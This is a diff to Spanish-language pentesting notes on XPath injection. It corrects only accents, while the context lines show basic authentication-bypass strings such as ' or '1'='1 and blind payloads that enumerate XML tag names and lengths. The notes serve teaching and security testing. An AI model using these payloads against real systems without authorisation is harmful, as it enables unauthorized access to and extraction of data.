@@ -24,7 +24,7 @@ Este tipo de inyecciones las debemos de hacer en documentos XML.
 
 * [XPath-Injection](https://book.hacktricks.xyz/pentesting-web/xpath-injection)
 
-Algunas inyecciones basicas son
+Algunas inyecciones básicas son
 ```bash
 ❯ ' or '1'='1
 ❯ " or "1"="1
@@ -61,7 +61,7 @@ Ahora debemos de descubrir el nombre de las etiquetas secundarias.
 ❯ 1' and string-length(name(/*[1]/*[1]))='6            # Para saber la longitud de la cadena de esa etiqueta secundaria, aqui le decimos que si es igual a seis, si nos muestra el producto es correcto, de lo contrario no.
 ```
 
-Despues debemos de conocer el nombre de las sub-etiquetas
+Después debemos de conocer el nombre de las sub-etiquetas
 ```bash
 ❯ 1' and count(/*[1]/*[1]/*)>'2                   # Contaremos el numero de etiquetas secundarias, si nos sale el producto quiere decir que es valida. El valor que estaremos variando es el segundo [1] a 2,3,4 depende de las etiquetas secundarias anteriormente encontradas
 ```
